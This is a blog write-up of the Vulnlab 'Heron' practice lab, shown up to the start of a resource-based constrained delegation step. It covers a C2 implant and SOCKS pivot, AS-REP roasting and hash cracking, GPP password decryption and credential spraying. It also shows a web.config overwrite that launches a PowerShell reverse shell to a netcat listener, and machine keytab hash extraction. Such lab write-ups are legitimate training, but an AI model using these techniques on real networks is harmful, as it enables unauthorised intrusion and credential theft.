---
title: Heron - Vulnlab
date: 2024-06-28 16:56:03
tags: [vulnlab, Medium, CHAIN]
categories: vulnlab
keywords: 'Vulnlab, Medium, Linux, Windows'
description: This is the newest chain in the medium difficulty that was created by xct, I'm going into this relatively blind so I hope I'll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. 
cover: /images/vulnlab/heron-vl/heron_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This is the newest chain in the medium difficulty that was created by xct, I'm going into this relatively blind so I hope I'll be able to relay the info that I know correctly. It involves an assumed breach scenario within a domain-joined Linux machine, requiring a pivot takeover to the domain controller for completion. 

I want to thank both xct and otter for their help on this during the initial access portion of the chain, overthinking is a common attribute to have when you start out as a red teamer so it's important to keep it simple (at least that's what I learned for initial access during this chain).

# Enumeration

Let's do our usual NMAP scans.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:48 EDT
Nmap scan report for 10.10.128.117
Host is up (0.10s latency).
All 1000 scanned ports on 10.10.186.21 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 113.11 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 20:50 EDT
Nmap scan report for 10.10.128.118
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 17.67 seconds
```

There doesn't seem to be much for us to work with here. From my first guess, every port within the domain controller `.21` is behind a firewall. This means we won't be able to access it until after we have taken control of the first machine. Furthermore this also means we have no way to identify any users directly from the DC due to Kerberos not being accessible.

We'll have to start from SSH on the domain-joined Linux machine, as this seems to be the only port available. I also made sure to confirm this as the case with `rustscan`, which you can find [here](https://github.com/RustScan/RustScan). It's a modernized version of NMAP, and is used for discovering ports at an increased pace.

Luckily enough I gave a quick peek at the Wiki page for the machine and it seems that this is an assumed-breach scenario. Heron Corp has given us credentials from which to use for our pen-test.

```
pentest:Heron123!

└─$ ssh pentest@10.10.128.118
......
Last login: Fri Jun  7 10:34:38 2024 from 10.8.0.101
pentest@frajmp:~$
```

# SOCKS Proxy to the DC

So as explained earlier, the first part of this chain is looking through the domain-joined Linux machine and understanding if there are any ways to elevate to root. Given that the first machine of this chain is through the Linux machine, I'm assuming that once we obtain root access we should have the ability to use the machine account and the `/etc/krb5.keytab` file (containing the machine account's NT hash) to compromise the DC.

However after a bit of file enumeration, you'll notice that there isn't really much for you to exploit initially. We don't have access to any of the users (nor are there any binaries for us to exploit as the `pentest` user, however there are two domain users in the `/home` directory which are `svc-web-accounting` and `svc-web-accounting-d`. Since we have these users, we can try to kerberoast/ASREProast to try and decrypt their plaintext passwords. In order to even do this though, we'll need to interact with the DC.

Since we don't have access to the DC directly from our local machine, we can use a proxy determine if the jumpbox is able to connect to it due to it being within the scope of the firewall (or at least there seems to be a firewall active). We'll need to start up a SOCKS proxy on the jumpbox in order to do this, and then execute our commands through the proxy. I usually opt to use `proxychains` for this, though you are free to use other tools that accomplish the same result.

I'll start up a [Sliver C2](https://github.com/BishopFox/sliver) server on our local Kali machine, I'm mainly doing this because Sliver has a built in SOCKS proxy command that should start a proxy on a given port easily. Firstly, we'll need to create an implant and curl it to the jumpbox.

```
sliver > generate --mtls (KALI IP) --os linux --arch amd64 --skip-symbols --save /home/daz/tech/vl/heron/writeup/ --name heron_lin
```

![](/images/vulnlab/heron-vl/b.png)

```
sliver > mtls

[*] Starting mTLS listener ...

[*] Successfully started job #1

[*] Session 39b2e695 heron_lin - 10.10.128.118:37554 (frajmp.heron.vl) - linux/amd64 - Thu, 27 Jun 2024 23:34:54 EDT
```

Now that we have an implant on the jumpbox, we can start up a SOCKS proxy as explained earlier using `socks5 start`. The default port for the proxy should be running on port 1081, though it may be different for others.

```
sliver (heron_lin) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081  
⚠  In-band SOCKS proxies can be a little unstable depending on protocol
```

Now that we have the proxy running through the implant, we'll need to edit our proxychains configuration file to reflect the port that the proxy is being served on. This can be found at either `/etc/proxychains.conf` or `/etc/proxychains4.conf`.

The setting that we'll need to change is at the bottom of the configuration file, denoted (with changes) from the below.

```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks5 127.0.0.1 1081
```

Now that the configuration is set, you should be able to interact with the `proxychains4` (or `proxychains`) utility directly from Kali. This should be able to direct all of your tools to be executed within the space of the jumpbox instead of your local machine. Let's verify that this works by running an NMAP scan for port 445 (SMB) on the DC (just due to this being a default port).

```
└─$ proxychains4 nmap -sT -p445 10.10.128.117
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-27 23:40 EDT
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK
Nmap scan report for mucdc.heron.vl (10.10.128.117)
Host is up (0.22s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
```

As you can see, it seems that the SMB port is open on the DC meaning that the firewall is indeed active. This means that most (if not, all) of our tooling will need to go through our proxy.

Our next step is to scan the DC to determine what other ports are available on it. I used SMB as a dummy port for the test above (which we know came back as an open port) so we'll look for ports aside from that.

I've found that using NMAP through a SOCKS proxy is generally slow, due to having to go through the tunnel for each specific port. An easy workaround for this is scanning ports directly from jumpbox by dropping a binary to the machine. To prevent having to also recursively drop all of the libraries that NMAP uses, I decided to utilize an alternative being [rustscan](https://github.com/RustScan/RustScan).

We can upload the binary easily with Sliver's `upload` command.

```
pentest@frajmp:/tmp$ chmod 777 rustscan
pentest@frajmp:/tmp$ ./rustscan -a 10.10.128.117
......
Open 10.10.128.117:389
Open 10.10.128.117:445
Open 10.10.128.117:464
Open 10.10.128.117:53
Open 10.10.128.117:80
Open 10.10.128.117:88
Open 10.10.128.117:135
Open 10.10.128.117:139
Open 10.10.128.117:593
Open 10.10.128.117:636
Open 10.10.128.117:3268
Open 10.10.128.117:3269
Open 10.10.128.117:3389
Open 10.10.128.117:9389
```

As you can see, the usual ports for a DC seem to be open (notably LDAP and RDP). However it seems as though a webserver is also open on the DC.

# Tunneling to the HTTP Webserver on the DC

Before we interact with LDAP at all, I want to take a look to the at the webserver to see if there is anything for us to exploit initially.

To ensure that we know the domain name of the DC (the jumpbox's domain name is `frajmp` as seen in the SSH login), we can use `crackmapexec` to view the information with no credentials.

```
└─$ proxychains4 crackmapexec smb 10.10.128.117                                
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:135  ...  OK
SMB         10.10.128.117   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
```

As seen from the above, the DC's domain name is `mucdc.heron.vl`. We'll add this as well as `frajmp.heron.vl` to our `/etc/hosts` file to reflect any domain name resolutions that we might need in the future.

We'll need to use our SOCKS proxy to be able to access the webserver, which we can do by utilizing a separate profile in FoxyProxy. I usually use this solely for Burpsuite, so it's a nice change of pace to be able to use FoxyProxy for another purpose. Let's create another profile that uses the SOCKS proxy specifically.

![](/images/vulnlab/heron-vl/c.png)

Make sure that the `Port` and `Type` reflect the proxy accordingly. Once this profile is created, enable it through the FoxyProxy extension and attempt to access the webpage.

![](/images/vulnlab/heron-vl/d.png)

As you can see from the image, it seems that this webpage is the static landing page for Heron Corp. While there isn't much to see here, we do have more users to add to our LDAP enumeration list that we'll be trying to exploit shortly.

Just to ensure that we aren't missing any other web applications, let's try to see if we can access any subdomains running on this port. I ran into some issues running `gobuster` through the proxy from our local machine (mainly the webserver crashing), so let's try to do it from the jumpbox. Fortunately, `ffuf` does not use any additional libraries so I wouldn't expect there to be any issues if we drop the sole binary to the jumpbox.

We'll also need to drop a subdomain wordlist to use alongside `ffuf`, I usually opt to use `subdomains-top1million-110000.txt` from [SecLists](https://github.com/danielmiessler/SecLists). 

```
sliver (heron_lin) > upload /usr/bin/ffuf

[*] Wrote file to /tmp/ffuf

sliver (heron_lin) > upload /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

[*] Wrote file to /tmp/subdomains-top1million-110000.txt
```

If you receive a timeout on the Sliver upload command for `ffuf`, disregard as it should still upload it to the machine.

If we do run `ffuf` to enumerate subdomains, every request will come back with a 200 status code (indicating a false positive). We can avert this by excluding the size of the request that seems to be the same amongst all of the false positives using the `-fs` tag.

```
pentest@frajmp:/tmp$ ./ffuf -w subdomains-top1million-110000.txt -u http://heron.vl -H "Host: FUZZ.heron.vl" -fs 4128

accounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
```

We seem to have received a `401` request for `accounting` as the subdomain, let's see if we can browse to it to understand why this specific subdomain is encountering an error.

![](/images/vulnlab/heron-vl/e.png)

This subdomain seems to have authentication tied to it, meaning we won't be able to access it until later on in the attack path.

# ASREPRoasting to Crack Passwords

Given the point that we're at now, we should have a few users that we can test against to determine if any users are vulnerable to kerberoasting or ASREProasting. The user list at this point should look like the following. (Note that I added a few usernames that are regularly on Windows workstations, such as `Administrator` and `Guest`)

```
Administrator
krbtgt
Guest
svc-web-accounting-d
svc-web-accounting
wayne.wood
julian.pratt
samuel.davies
```

Let's test for ASREProasting using Impacket's `GetNPUsers` tool. Essentially what this will do is check if the `NO_PREAUTH_REQUIRED` is set to the user's accounting. If this is set to a user account, we can essentially send an ASREQ to the KDC which will return an ASREP ticket that is encrypted with the users plaintext password.

We'll use the Guest account with no password to run this command.

```
└─$ proxychains4 impacket-GetNPUsers heron.vl/'Guest' -dc-ip 10.10.128.117 -no-pass -request -usersfile initial_ul.txt
......
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:88  ...  OK
$krb5asrep$23$samuel.davies@HERON.VL:11082947e1ef[...snip...]e1316ef77fc294
```

As seen from above, a valid ASREP ticket was returned for the `samuel.davies` user. We can try to crack this using `hashcat` along with the specific hash ID (being 18200) as seen in the [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes).

```
└─$ hashcat -a 0 -m 18200 samuel.davies.txt /usr/share/wordlists/rockyou.txt
......
a6b5c3a4a77676b6134c9302e03726ef67af6288c07a47e44072e62fb80bad6d758edeacacfea413637179588c6a110a65570e84e9a9cf843663bd66f851e193a13943e1316ef77fc294:[...snip...]

Session..........: hashcat
Status...........: Cracked
```

As seen from the above, we were able to successfully crack the password for `samuel.davies`. This opens up our attack path to a range of various options, notably dumping LDAP as my initial thought.

# Dumping LDAP

Let's now dump the domain with Bloodhound and the [Python ingestor](https://github.com/dirkjanm/BloodHound.py). We can examine any domain objects and also determine if `samuel.davies` has any privileges against other users. This should also increase our user list as you'll see shortly.

```
└─$ proxychains4 bloodhound-python -d 'heron.vl' -u 'samuel.davies' -p '(SAMUEL.DAVIES PASSWORD)' -c all -ns 10.10.128.117 --zip
......
INFO: Compressing output into 20240628004605_bloodhound.zip
```

We can now upload the compressed archive to Bloodhound after starting up the `neo4j` and `bloodhound` applications respectively.

Upon viewing the domain objects, it does not seem that `samuel.davies` has any notable privileges to exploit in our situation. That being said, I did notice a privilege that one of the users on our current user list has.

![](/images/vulnlab/heron-vl/f.png)

It seems that the `svc-web-accounting` has `GenericWrite` privileges over the `MUCJMP` workstation. While it seems that this chain only consists of two machines, it seems that there could be other machine accounts that are present within the environment.

I did some more enumeration on the other machine accounts present in LDAP, and it seems that this environment also has `ACCOUNTING-PREP` and `ACCOUNTING-STAG`.

Moving on from this, I made sure to utilize `ldapsearch` through our SOCKS proxy to increase our user list. I've made a script to do this for us, as seen below.

```
└─$ proxychains4 ldapsearch -x -LLL -H ldap://mucdc.heron.vl -D 'samuel.davies@heron.vl' -b 'DC=heron,DC=vl' -w '(SAMUEL.DAVIES PASSWORD)' | grep userPrincipalName | awk '{print $2}' | cut -d '@' -f 1 > full_ul.txt
```

As we can see with the file created from `ldapsearch`, our user list has increased to over 20 users.

```
Katherine.Howard
Rachael.Boyle
Anthony.Goodwin
Carol.John
Rosie.Evans
Adam.Harper
Adam.Matthews
Steven.Thomas
Amanda.Williams
Vanessa.Anderson
Jane.Richards
Rhys.George
Mohammed.Parry
Julian.Pratt
Wayne.Wood
Danielle.Harrison
Samuel.Davies
Alice.Hill
Jayne.Johnson
Geraldine.Powell
adm_hoka
adm_prju
svc-web-accounting
svc-web-accounting-dev
```

We can test for kerberoasting/ASREProasting for these users, to which you will find that `svc-web-accounting` is kerberoastable. That being said even if you do get an encrypted Kerberos TGT from them, you are unable to crack it (from just using rockyou).

# Enumerating SMB Shares

I decided to move on from LDAP at this point, since it seems that we'll need to compromise another user through another service if we want to move forward in the attack chain. Since we have credentials for `samuel.davies`, we can see if there are any shares that we have read access to.

```
└─$ proxychains4 smbclient -L 10.10.128.117 -U 'samuel.davies'                     
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.128.117:445  ...  OK
Password for [WORKGROUP\samuel.davies]:

Sharename       Type      Comment
---------       ----      -------
accounting$     Disk      
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
CertEnroll      Disk      Active Directory Certificate Services share
home$           Disk      
IPC$            IPC       Remote IPC
it$             Disk      
NETLOGON        Disk      Logon server share 
SYSVOL          Disk      Logon server share 
transfer$       Disk
```

As you can see it seems that there are a lot of shares that are on the DC. 

I'll save us the time due to some prior enumeration that I did into this - it seems that we cannot access `accounting$` and `it$`, and `home$` and `transfer$` do not seem to have any files within any of their folders. 

`CertEnroll` did seem suspicious at first, as there seems to be a few expired ADCS certifications that I initially thought could be reused for exploitation. I eventually deduced this to be a rabbit hole and moved elsewhere.

The interesting part that I found however was in the `SYSVOL` share. I don't normally find much in this share (aside from the logon script exploit that I did for [Baby2](https://dan-feliciano.com/2024/06/05/baby2/)), however it's still important to enumerate everything possible in every share that you have access to for this service.

```
smb: \heron.vl\Policies\{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}\Machine\Preferences\Groups\> ls
  .                                   D        0  Tue Jun  4 11:59:44 2024
  ..                                  D        0  Tue Jun  4 11:59:44 2024
  Groups.xml                          A     1135  Tue Jun  4 12:01:07 2024
```

It seems that there is an XML file that we have read access to on the `SYSVOL` share. We'll pull this down to our local machine to see if in contains any relevant information.

```
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2024-06-04 15:59:45" uid="{535B586D-9541-4420-8E32-224F589E4F3A}"><Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)"><Members><Member name="HERON\svc-web-accounting" action="ADD" sid="S-1-5-21-1568358163-2901064146-3316491674-24602"/><Member name="HERON\svc-web-accounting-d" action="ADD" sid="S-1-5-21-1568358163-2901064146-3316491674-26101"/></Members></Properties></Group>
        <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)" image="2" changed="2024-06-04 16:00:13" uid="{F3B0115E-D062-46CC-B10C-C3EB743C824A}"><Properties action="U" newName="_local" fullName="" description="local administrator" cpassword="[...snip...]" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" subAuthority="RID_ADMIN" userName="Administrator (built-in)"/></User>
</Groups>
```

The file itself seems to be configuring two of the domain user objects, specifically `svc-web-accounting` and `svc-web-accounting-d`. It seems that there also seems to be an encoded password for the "local administrator" user at the bottom of the file.

I've seen this `cpassword` term before in other exploits that I've done in the past, and I do recall a tool that we can use to crack this password specifically. That tool is [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt). I'd tried to interpret the code a bit before doing it to understand what it was exactly doing. It seems that script takes the password and adds base64 padding to it before decoding the entire base64 string based on a specific AES key that is used for the `gpp` algorithm.

We can use the Python POC without needing to use the setup script within the repository, as seen below.

```
└─$ python3 gpp-decrypt/gpp-decrypt.py -f Groups.xml 

                               __                                __ 
  ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_
 / _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/
 \_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/ 
/___/  /_/    /_/                                /___/  /_/         

[ * ] Username: Administrator (built-in)
[ * ] Password: [...snip...]
```

This returns a password for the built-in Administrator user (which is not the Administrator of the DC), so we'll run this against our user list to see if the password corresponds to any users.

Quick note, make sure to use the actual username for `svc-web-accounting-d` in the user list, as the LDAP command we used from before takes their display name which is `svc-web-accounting-dev`.

```
└─$ proxychains4 crackmapexec smb 10.10.128.117 -u full_ul.txt -p '(BUILT-IN ADMINISTRATOR PASSWORD)'
......
SMB         10.10.128.117   445    MUCDC            [+] heron.vl\svc-web-accounting-d:[...snip...]
```

As you can see, this should return a valid username/password combination for `svc-web-accounting-d`.

# Exploiting the Accounting App

Note that at this point I took a break in between creating this writeup, so the IP addresses will change. The updated addresses for `mucdc.heron.vl` and `frajmp.heron.vl` are `10.10.220.53` and `10.10.220.54`.

Since we have valid credentials for `svc-web-accounting-d`, I decided to see if we had access to the `accounting$` SMB share that we saw previously.

```
└─$ proxychains4 smbclient \\\\10.10.220.53\\accounting$ -U 'svc-web-accounting-d'
Password for [WORKGROUP\svc-web-accounting-d]:
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.54:445  ...  OK
Try "help" to get a list of possible commands.
smb: \> ls

  .                                   D        0  Fri Jun  7 02:14:04 2024
  ..                                DHS        0  Sun Jun  2 11:26:14 2024
  AccountingApp.deps.json             A    37407  Sun Jun  2 15:25:26 2024
  AccountingApp.dll                   A    89600  Sun Jun  2 15:25:26 2024
  AccountingApp.exe                   A   140800  Sun Jun  2 15:25:26 2024
  AccountingApp.pdb                   A    39488  Sun Jun  2 15:25:26 2024
  AccountingApp.runtimeconfig.json      A      557  Sat Jun  1 18:22:20 2024
  appsettings.Development.json        A      127  Sat Jun  1 18:00:54 2024
  ......
```

It seems that we successfully were able to gain access to the `accounting$` share, and there seem to be a lot within the contents of this share.

There seems to be a consistent notice of this share having contents related to an accounting app, based on the file names. My guess to this is that this could potentially be the configuration directory for the accounting subdomain we found earlier.

Given that we have access to all of these files, I'm assuming that these will be valid credentials to the simple authentication that this website requires.

![](/images/vulnlab/heron-vl/g.png)

Entering in the credentials for `svc-web-accounting-d` seems to land us at the respective accounting application. This cements my theory that the SMB share seems to be linked to the backend of this application.

Given that we have access to the files that build up the accounting app, I'm assuming that we should have RCE if we exploit this appropriately. Let's take a look further into this share to see if there are any files to exploit.

After doing a bit of research into this application (finding that this is an IIS application running ASP.NET), the actual exploitation consists of the `web.config` file that is located on the root directory of this SMB share.

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="*" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="dotnet" arguments=".\AccountingApp.dll" stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="inprocess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```

This file specifically seems to be related to the runtime arguments that actually define how this application is initialized. As we can see, the `aspNetCore` module is created by executing `AccountingApp.dll`, which I'm assuming is then chained to execute all of the other libraries within this directory.

After doing some research, I found an RCE exploit that we can utilize that uses `aspNetCore` module that is already present in the configuration file. The resource I used for RCE exploit can be found [here](https://medium.com/@jeroenverhaeghe/rce-from-web-config-461a5eab8ce9), all credit goes to Jeroen Verhaeghe.

If we alter the `aspNetCore` module to instead use PowerShell as its process path, we can pass in PowerShell arguments into the arguments section within the module. In theory, this should render the website unusable due to the application requiring the serialization of `AccountingApp.dll`. That being said, it should execute our payload before receiving this error. This was essentially the only way to achieve RCE that I found, I am open to understanding other ways to achieve this without rendering the web application unusable.

So with that being said let's replace the module initialization and the actual module itself, I've made the necessary changes to the file as seen below (Note that the payload that I'm using is from [revshells](https://www.revshells.com/)).

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="execute.now" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
      <aspNetCore processPath="powershell" arguments="-e (POWERSHELL BASE64 PAYLOAD)" hostingModel="OutOfProcess" />
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```

The `POWERSHELL BASE64 PAYLOAD` that I used was the PowerShell #3 Base64 payload from [revshells](https://www.revshells.com/).

We'll start up our listener using `nc -lvnp 9002` and replace the `web.config` file that is currently in the SMB share with the new changes. You can do so by just removing the current config and putting your new config in the share.

```
smb: \> rm web.config
smb: \> put web.config
putting file web.config as \web.config (5.8 kb/s) (average 5.8 kb/s)
```

Let's now browse to the path that we specified to execute the PowerShell payload, which is `http://accounting.heron.vl/execute.now`.

As you can see from the netcat payload, we'll receive a callback as `svc-web-accounting` on the DC.

```
└─$ nc -lvnp 9002      
listening on [any] 9002 ...
connect to [10.8.0.173] from (UNKNOWN) [10.10.220.53] 58887
PS C:\webaccounting> whoami
heron\svc-web-accounting
```

# Credential Hunting as svc-web-accounting

The interesting part that I found about this is that fact that there is a timeout on the web application that will essentially crash our current reverse shell after about a minute. This isn't very good practice in the real world, however it's essentially all that we can do at this with the only POC that I could think of. Again, very open to any different solutions that keep the reverse shell continuously up.

![](/images/vulnlab/heron-vl/h.png)

Luckily enough we can continue to get a reverse shell if we reopen our netcat listener and refresh the `execute.now` page. Had `svc-web-accounting` not been kerberoastable and their password WAS crackable, we could simply poison a request to a Responder endpoint and crack their NetNTLMv2 hash.

Luckily enough, we won't need this shell for very long. At this point, I enumerated the filesystem in between the intervals of the web application crashing. The `C:\` drive seems to be the parent directory of all of the SMB shares. 

```
Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/1/2024   8:10 AM                home
d-----         5/26/2024   2:31 AM                inetpub
d-----          6/6/2024   7:22 AM                it
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          6/6/2024   7:22 AM                Program Files
d-----          6/1/2024   7:30 AM                Program Files (x86)
d-----         5/26/2024   4:51 AM                transfer
d-r---          6/1/2024   8:43 AM                Users
d-----         6/28/2024  12:38 PM                webaccounting
d-----          6/2/2024   8:26 AM                Windows
-a----          6/2/2024   3:45 AM             36 flag.txt
```

You can also see that the first flag is within the `C:\` drive, meaning we have completed a 1/3 of this chain.

To save some time, I spent a decent amount of attempts looking through all of the folders recursively to see if any DPAPI credentials or really just any credentials were cached in any files. After about an hour of credential hunting, I came across a file within `C:\Windows\scripts\ssh.ps1`.

```
PS C:\Windows\scripts> cat ssh.ps1
$plinkPath = "C:\Program Files\PuTTY\plink.exe"
$targetMachine = "frajmp"
$user = "_local"
$password = "[...snip...]"
& "$plinkPath" -ssh -batch $user@$targetMachine -pw $password "ps auxf; ls -lah /home; exit"
```

This seems to contain the SSH password for the `_local` user. An admin user was probably trying to establish an SSH session to the `frajmp` jumpbox as this user using PuTTY.

Now that we have these credentials, we can try to login as this user on the jumpbox. We also won't need our reverse shell as `svc-web-accounting` any longer.

# Root Access to FRAJMP

Now that we have access as this user, we'll login in our other session as `pentest`.

```
pentest@frajmp:/tmp$ su _local
Password: 
_local@frajmp:/tmp$
```

Testing our root access with the password that we currently have indicates to me that this user has SUDO privileges to the entire filesystem.

```
_local@frajmp:/tmp$ sudo -l
[sudo] password for _local: 
Matching Defaults entries for _local on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User _local may run the following commands on localhost:
    (ALL : ALL) ALL
```

Since we have that, we can simply log in as the root user using `sudo su`.

```
_local@frajmp:/tmp$ sudo su
root@frajmp:/tmp# whoami
root
```

The second flag for this machine is within the root users home directory in `/root`. There isn't much to see aside from that, I did some file enumeration and did not come back with much.

I'll execute our Sliver implant just to ensure that we have access to the root user through our C2 server. This is just in case we need to tunnel any tools to the DC with the highest privilege on `FRAJMP`. --> `./heron_lin &`

![](/images/vulnlab/heron-vl/i.png)

# Pivoting to the DC

Now that we have completely compromised the `FRAJMP` jumpbox, we can extract a very important piece of information on domain-joined Linux machines that I learned to exploit during [Hybrid](https://dan-feliciano.com/2024/06/05/hybrid/).

There's a file that exists on domain-joined Linux machines called `krb5.keytab`, which contains secrets to the machine account. If this file is decrypted, we can view the machine accounts NT hash. This machine account has the potential to have privileges that can lead us to the DC.

We can use a tool called [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) for this. The Python script associated with this allows us to match key values with their encryption types, varying from different types of AES encryption algorithms. Once decrypted with the keytab file (you can download this to your local machine using Sliver), you should receive an output similar to the below.

```
└─$ python3 KeyTabExtract/keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HERON.VL
        SERVICE PRINCIPAL : FRAJMP$/
        NTLM HASH : 6f55b[...snip...]e8254f7
        AES-256 HASH : 7be44e62e24[...snip...]a3050dd586130e7
        AES-128 HASH : dcaae[...snip...]6cbd0cd
```

Now that we have this machine account we would be able to use it in a variety of different domain escalation tactics if `FRAJMP$` has any privileges over any other domain objects.

That being said, we actually are not required to do this. I did some testing with `crackmapexec` to see if their was any password reusage on the `_local` user credentials that we have and came back with a successful result to a new user.

```
└─$ proxychains4 crackmapexec smb 10.10.220.53 -u full_ul.txt -p '(_local PASSWORD)' --continue-on-success
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:135  ...  OK
......
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.10.220.53:445  ...  OK
SMB         10.10.220.53    445    MUCDC            [+] heron.vl\Julian.Pratt:[...snip...]
```

As you can see, the `Julian.Pratt` user seems to have the same password as the `_local` user on the jumpbox. We can assume that `Julian.Pratt` (with him being the head of IT) was attempting to try and set up an SSH connection to `FRAJMP` using PuTTY.

Since we have access to this user now with his credentials, we can login to his home directory that is being hosted on SMB.

```
smb: \Julian.Pratt\> ls
  .                                   D        0  Sun Jun  2 06:47:14 2024
  ..                                  D        0  Sat Jun  1 11:10:46 2024
  frajmp.lnk                          A     1443  Sun Jun  2 06:47:47 2024
  Is there a way to -auto login- in PuTTY with a password- - Super User.url      A      117  Sat Jun  1 11:44:44 2024
  Microsoft Edge.lnk                  A     2312  Sat Jun  1 11:44:38 2024
  mucjmp.lnk                          A     1441  Sun Jun  2 06:47:33 2024
```

It seems that this contains a multitude of `lnk` files that we can pull from this share. We'll use `mget *` to read these on our local machine.

`frajmp.lnk` seems to be partially unreadable, however it contains the plaintext password for `_local` and `Julian.Pratt` that we already have. `Microsoft Edge.lnk` also does not seem to have anything of use to us, containing some directory calls to the Edge application.

The part of use to us seems to be within `mucjmp.lnk`, which seems to contain the plaintext password for `adm_prju` amongst some unreadable text.

```
└─$ cat mucjmp.lnk                                                                 
2t▒`��ف+B�� �gP�O� �:i�+00�/C:\�1�X�sPROGRA~1t  ﾨR�B�X�s.BJz
AProgram Files@shell32.dll,-21781▒P1�X�[PuTTY<  ﾺX�[�X�[.���PuTTY\2 ��X�� putty.exeD    ﾆX���X�[.putty.exe▒O-N�h�ZC:\Program Files\PuTTY\putty.exe#..\..\Program Files\PuTTY\putty.exeC:\Program Files\PuTTY$adm_prju@mucjmp -pw [...snip...]�&�
```

# RBCD to MUCDC

If we look at `adm_prju`'s domain node in Bloodhound, we can see that they possess an interesting outbound access control.

![](/images/vulnlab/heron-vl/j.png)

It seems that since `adm_prju` is within the `ADMINS_T1` group, they have the `WriteAccountRestrictions` privilege over the domain controller.

Having `WriteAccountRestrictions` means that `adm_prju` has write access to all of the attributes on the machine, notably `msDS-AllowedToActOnBehalfOfOtherIdentity`. If we have the ability to modify this attribute, this means we can abuse resource-based constrained delegation.

For a small note on what resource-based constrained delegation is, it essentially allows us to request a service ticket for a specified service name to which will be impersonated by a user of our selection. We can then import this service ticket to use for either authentication or credential dumping, depending on the user we impersonate.

The process for this is relatively simple, as Bloodhound outlines our attach flow in their help page for this specific attack. Note that this requires the user to have control of a machine that has an SPN set, which we currently do since we have control over `FRAJMP` and it's NT hash (meaning we'll just need to PTH with the `FRAJMP$` NT hash in our commands instead of a password).

So to start let's ensure that `FRAJMP$` can delegate on behalf of `MUCDC$`.

```
